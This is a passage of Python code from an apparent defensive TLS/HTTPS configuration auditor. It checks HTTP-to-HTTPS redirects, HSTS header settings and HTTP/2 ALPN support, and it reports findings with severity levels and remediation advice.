                "title": "HTTP_NO_HTTPS_REDIRECT",
                "detail": (
                    f"http://{host}:80/ returned HTTP 200 with no redirect to "
                    "HTTPS -- plaintext HTTP traffic is readable to any on-path "
                    "observer without any cryptanalysis; all HTTP listeners should "
                    "return a 301 redirect to the HTTPS origin; Security "
                    "Engineering §4.2: passive eavesdropping is the lowest-cost "
                    "attack against cleartext protocols"
                ),
                "host": host,
                "port": 80,
            })
        elif redir_status == 302:
            findings.append({
                "severity": "MEDIUM",
                "title": "HTTPS_REDIRECT_TEMPORARY",
                "detail": (
                    f"http://{host}:80/ returned HTTP 302 (temporary redirect) to "
                    "HTTPS -- temporary redirects are not cached by browsers, so "
                    "every initial HTTP request remains a plaintext exposure window "
                    "vulnerable to SSLstrip interception; replace 302 with 301 to "
                    "enable browser-side caching of the upgrade decision"
                ),
                "host": host,
                "port": 80,
            })
        elif redir_status == 301:
            findings.append({
                "severity": "INFO",
                "title": "HTTPS_REDIRECT_PERMANENT",
                "detail": (
                    f"http://{host}:80/ correctly returns HTTP 301 (permanent "
                    "redirect to HTTPS) -- browsers cache this directive, narrowing "
                    "the SSLstrip exposure to only a first-ever visit from a new "
                    "browser profile; pair with HSTS preload to eliminate that window"
                ),
                "host": host,
                "port": 80,
            })
    except Exception:
        pass

    # ── 3. HSTS configuration check ───────────────────────────────────────────
    # Strict-Transport-Security prevents SSLstrip by instructing browsers to
    # connect only via HTTPS for the declared period. Missing or weak HSTS
    # leaves downgrade windows open regardless of redirect configuration.
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE

        https_url = f"https://{host}:{port}/"
        req = _urlreq.Request(
            https_url,
            headers={"User-Agent": "Mozilla/5.0 (compatible; SecurityAudit/1.0)"},
        )
        resp = _urlreq.urlopen(req, timeout=timeout, context=ctx)
        resp_headers = {k.lower(): v for k, v in resp.headers.items()}
        hsts = resp_headers.get("strict-transport-security", "")

        if not hsts:
            findings.append({
                "severity": "HIGH",
                "title": "HSTS_NOT_SET",
                "detail": (
                    f"https://{host}:{port}/ does not return a "
                    "Strict-Transport-Security response header -- without HSTS, "
                    "SSLstrip can intercept the initial HTTP request before a "
                    "redirect is seen; Security Engineering §4.6: protocol "
                    "downgrade attacks exploit gaps between the advertised and "
                    "enforced security level at session establishment"
                ),
                "host": host,
                "port": port,
            })
        else:
            ma_match = re.search(r'max-age=(\d+)', hsts, re.IGNORECASE)
            if ma_match:
                max_age = int(ma_match.group(1))
                if max_age < 31536000:
                    findings.append({
                        "severity": "MEDIUM",
                        "title": "HSTS_SHORT_MAX_AGE",
                        "detail": (
                            f"HSTS max-age={max_age} ({max_age // 86400} days) is "
                            "below the recommended minimum of 31536000 (365 days) -- "
                            "short HSTS lifetimes reduce the browser-cached protection "
                            "window; NIST SP 800-52 Rev2 recommends >= 1 year; "
                            "hstspreload.org requires >= 1 year for preload eligibility"
                        ),
                        "host": host,
                        "port": port,
                    })

            if "includesubdomains" not in hsts.lower():
                findings.append({
                    "severity": "MEDIUM",
                    "title": "HSTS_NO_SUBDOMAINS",
                    "detail": (
                        "HSTS header is missing the 'includeSubDomains' directive -- "
                        "subdomains remain reachable over plain HTTP and can be used "
                        "to set malicious cookies scoped to the parent domain or to "
                        "initiate protocol downgrade attacks that bypass the parent's "
                        "HSTS policy; add includeSubDomains once all subdomains are "
                        "HTTPS-ready"
                    ),
                    "host": host,
                    "port": port,
                })

            if "preload" not in hsts.lower():
                findings.append({
                    "severity": "LOW",
                    "title": "HSTS_NOT_PRELOADED",
                    "detail": (
                        "HSTS header is missing the 'preload' directive -- the domain "
                        "is not eligible for submission to browser HSTS preload lists "
                        "(chromium.googlesource.com/chromium/src/+/main/net/http/"
                        "transport_security_state_static.json); preloading eliminates "
                        "the first-visit SSLstrip window entirely without relying on "
                        "a prior HTTPS connection to seed the browser's HSTS cache"
                    ),
                    "host": host,
                    "port": port,
                })
    except Exception:
        pass

    # ── 4. HTTP/2 ALPN negotiation check ──────────────────────────────────────
    # Servers that do not offer h2 via ALPN fall back to HTTP/1.1 or HTTP/1.0.
    # HTTP/1.0-only servers lack virtual-host isolation (no mandatory Host header),
    # have no pipelining safety, and miss HTTP/2 security improvements.
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])

        with _socket.create_connection((host, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as tls:
                negotiated_proto = tls.selected_alpn_protocol()

        if negotiated_proto != "h2":
            findings.append({
                "severity": "MEDIUM",
                "title": "NO_HTTP2_SUPPORT",
                "detail": (
                    f"Server at {host}:{port} negotiated "
                    f"'{negotiated_proto or 'http/1.1'}' via ALPN instead of h2 -- "
                    "HTTP/2 is not supported; HTTP/1.x-only servers lack HPACK "
                    "header compression (which prevents CRIME/BREACH-class attacks "
                    "on repeated header fields), multiplexing, and stream priority "
                    "controls; HTTP/1.0 acceptance also indicates absence of "
                    "mandatory Host-header enforcement and virtual-host isolation"
                ),
                "host": host,
                "port": port,
            })
    except Exception:
        pass

    return findings


if __name__ == "__main__":
    import sys

    targets = sys.argv[1:] if len(sys.argv) > 1 else None
    auditor = CryptoAudit()
    auditor.audit(targets=targets)
    print(auditor.report())
